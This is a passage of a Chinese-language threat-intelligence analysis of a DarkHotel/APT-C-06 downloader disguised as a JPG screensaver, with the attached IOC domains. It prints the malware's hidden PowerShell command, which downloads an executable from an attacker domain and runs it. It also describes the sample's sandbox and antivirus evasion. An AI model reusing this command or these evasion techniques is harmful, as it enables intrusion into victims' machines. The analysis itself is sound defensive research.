data-line="155">360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。</p>\n<p class="line" data-line="157">该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。</p>\n<p class="line" data-line="159">我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。</p>\n<h2 class="line" data-line="161">IOC</h2>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>类型</strong></td>\n<td><strong>值</strong></td>\n</tr>\n<tr>\n<td><em>Downloader Domain</em></td>\n<td>all-microsoft-control.com</td>\n</tr>\n<tr>\n<td><em>C&amp;C Domain</em></td>\n<td>view-drama-online.com</td>\n</tr>\n</tbody>\n</table>\n</center>\n'}}],error:null,state:{pageId:[],tagParam:[],isMainPage:!1,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee3e",title:"DarkHotel定向攻击样本分析",category:"事件追踪",readableId:"darkhotel-targeted-attack-sample-analysis",abstract:"360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。",author:"代慧平",headImg:"/uploads/2017/08/17/daee2836562e4dcbddcaaab6ed605466.png",descImg:null,tags:["DarkHotel","APT"],publish_time:"2016-05-13T19:25:41.000Z",content:'<h2 class="line" data-line="0">引言</h2>\n<p class="line" data-line="2">人在做，天在看。</p>\n<p class="line" data-line="4">360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。</p>\n<p class="text-center line" data-line="6"><img src="/uploads/2017/07/25/b94e98a75d80901569781b7706c462a3.png" alt="" width="90%"></p>\n<p class="line" data-line="8">DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。</p>\n<h2 class="line" data-line="10">样本分析</h2>\n<h3 class="line" data-line="12">基本信息</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>样本MD5</strong></td>\n<td>43f3b56c1c01b007c35197c703e4d6a6</td>\n</tr>\n<tr>\n<td><strong>样本大小</strong></td>\n<td>131,072 Bytes</td>\n</tr>\n<tr>\n<td><strong>编译时间</strong></td>\n<td>2015-10-15  22:52:30</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DSC3013.JPG.scr</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="23">样本截图：</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/00bdf6b50ed64629185aa0f4c0af9b49.png" alt="" width="90%"></p>\n<h3 class="line" data-line="27">详细行为</h3>\n<p class="line" data-line="29">总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从<code>http://all-microsoft-control.com/kd/f.exe</code>下载PE并执行。</p>\n<p class="line" data-line="31">样本首先会获取TEMP目录的路径：</p>\n<p class="text-center line" data-line="33"><img src="/uploads/2017/07/25/115b3d5f8c7da4f3b907e8ac19dd4104.png" alt=""></p>\n<p class="line" data-line="35">然后拼出4个路径：</p>\n<ul>\n<li>\n<p>%temp%\\DSC3013.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3014.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3015.JPG</p>\n</li>\n<li>\n<p>%temp%\\desktop.lnk</p>\n</li>\n</ul>\n<p class="text-center line" data-line="45"><img src="/uploads/2017/07/25/6069b840d7398d5f48154c2d40cac2ae.png" alt="" width="90%"></p>\n<p class="line" data-line="47">会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/25/0bbb522a245a8fbbc734d4a54a8535ba.png" alt="" width="90%"></p>\n<p class="line" data-line="51">数据为JPG图片格式文件，如图：</p>\n<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/acba031979dbc593e8dc49992c70318a.png" alt="" width="90%"></p>\n<p class="line" data-line="55">图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。</p>\n<p class="text-center line" data-line="57"><img src="/uploads/2017/07/25/8569fdab5bafba66d82202502ae7230c.png" alt="" width="90%"></p>\n<p class="line" data-line="59">数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/fdcc62d03d69a9d1484e7505198ed139.png" alt="" width="90%"></p>\n<p class="line" data-line="63">之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:</p>\n<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/61dfbe5f493472fca4433423ce0868ed.png" alt="" width="90%"></p>\n<p class="line" data-line="67">接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：</p>\n<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/45f814441f410f839b2add1ffde8d73f.png" alt="" width="90%"></p>\n<p class="line" data-line="71">然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：</p>\n<p class="text-center line" data-line="73"><img src="/uploads/2017/07/25/767b77b1e45f1b449a46e065cdcff29b.png" alt="" width="90%"></p>\n<p class="line" data-line="75">文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：</p>\n<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/8517464a5af5bdb701d80b6453373bf9.png" alt="" width="90%"></p>\n<p class="line" data-line="79">把该块数据段保存成LNK文件，命令行参数如下：</p>\n<p class="text-center line" data-line="81"><img src="/uploads/2017/07/25/928be2ad6fc6d2623f0d6a4c16b4350b.png" alt=""></p>\n<p class="line" data-line="83">快捷方式指向的目标为：</p>\n<pre class="hljs"><code class="hljs">%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://all-microsoft-control.com/kd/f.exe \',\'%temp%\\~$ER96F\\.doc\')&&echo f|xcopy %temp%\\~$ER96F.doc %temp%\\dwm.exe /H /Y&&%temp%\\dwm.exe\n</code></pre>\n<p class="line" data-line="89">所以快捷方式被执行起来后，会调用powershell从http://all-microsoft-control.com/kd/f.exe下载到%temp%\\~$ER96F.doc，并把该文件重命名为dwm.exe后，运行起来。</p>\n<p class="line" data-line="91">最后会在同目录下生成desktop.bat，并把“del *.scr\\r\\ndel *.bat”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。</p>\n<p class="text-center line" data-line="93"><img src="/uploads/2017/07/25/f480320173f2d9f1716f6eb576e37ff1.png" alt="" width="90%"></p>\n<h3 class="line" data-line="95">远控木马</h3>\n<p class="line" data-line="97">目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/9d0ea33a223c2fdebd03a895edf31ceb.png" alt="" width="90%"></p>\n<p class="line" data-line="101">分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：</p>\n<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/74fcf6804bd22443ceb47358fc021ec2.png" alt="" width="90%"></p>\n<p class="line" data-line="105">样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：</p>\n<p class="text-center line" data-line="107"><img src="/uploads/2017/07/25/868677a706a24e956502810888c868cc.png" alt="" width="90%"></p>\n<p class="line" data-line="109">sub_497036是字符串的解密函数：</p>\n<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/c8f76a42d257ba8817e8b80416c2f570.png" alt=""></p>\n<p class="line" data-line="113">样本会检测虚拟机、沙箱和杀软：</p>\n<p class="line" data-line="115">卡巴</p>\n<p class="text-center line" data-line="117"><img src="/uploads/2017/07/25/6b5c4521e39cf81dc97b2e2a9db91a55.png" alt="" width="90%"></p>\n<p class="line" data-line="119">沙箱检测：</p>\n<p class="text-center line" data-line="121"><img src="/uploads/2017/07/25/fff4437f85266db166109fd32f6b86cc.png" alt=""></p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/d2b88af9186a3f06f23b0318416a98bc.png" alt=""></p>\n<p class="line" data-line="125">检测360的产品:</p>\n<p class="text-center line" data-line="127"><img src="/uploads/2017/07/25/600f0fbdf110cdd3b07a651bcfbb6c8e.png" alt="" width="90%"></p>\n<p class="line" data-line="129">检测金山和baidu的安全产品：</p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/25/b16792e0261b9c2d3068a6e226d8b3ff.png" alt="" width="90%"></p>\n<p class="line" data-line="133">检测通过后，会连接C&amp;C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：</p>\n<p class="text-center line" data-line="135"><img src="/uploads/2017/07/25/7515b38914cd0b2fe7495d5089164ac1.png" alt="" width="90%"></p>\n<p class="line" data-line="137">C&amp;C域名为：view-drama-online.com</p>\n<h2 class="line" data-line="139">相关分析</h2>\n<p class="line" data-line="141">使用高级账号查询360威胁情报中心，样本涉及的域名 all-microsoft-control.com 其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：</p>\n<p class="text-center line" data-line="143"><img src="/uploads/2017/07/25/d103771b3712fc6fae4ab8e6f460bdcb.png" alt=""></p>\n<p class="line" data-line="145">域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。</p>\n<p class="line" data-line="147">虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/4d53ddecf1f93575b5c6b4ac64455edf.png" alt="" width="90%"></p>\n<p class="line" data-line="151">事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。</p>\n<h2 class="line" data-line="153">关联组织</h2>\n<p class="line" data-line="155">360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。</p>\n<p class="line" data-line="157">该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。</p>\n<p class="line" data-line="159">我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。</p>\n<h2 class="line" data-line="161">IOC</h2>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>类型</strong></td>\n<td><strong>值</strong></td>\n</tr>\n<tr>\n<td><em>Downloader Domain</em></td>\n<td>all-microsoft-control.com</td>\n</tr>\n<tr>\n<td><em>C&amp;C Domain</em></td>\n<td>view-drama-online.com</td>\n</tr>\n</tbody>\n</table>\n</center>\n'}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.38f62477280dcc27df9e.js"></script><script defer src="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js"></script><script defer src="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js"></script>